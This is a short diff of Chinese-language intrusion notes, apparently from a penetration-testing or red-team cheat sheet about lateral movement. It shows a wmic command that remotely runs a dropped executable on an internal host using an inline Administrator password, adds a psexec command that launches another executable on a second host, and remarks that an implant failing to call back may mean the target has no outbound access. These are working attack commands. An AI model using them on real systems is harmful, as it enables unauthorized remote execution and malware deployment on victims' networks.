@@ -9,5 +9,9 @@
     wmic远程执行 
     shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
     
+    也可以使用psexec进行远程执行
+    
+    psexec.exe -accepteula \\192.168.41.150 -h -d c:\wanli.exe
+    
     如果发现很久没有上线，可能目标不出网
  
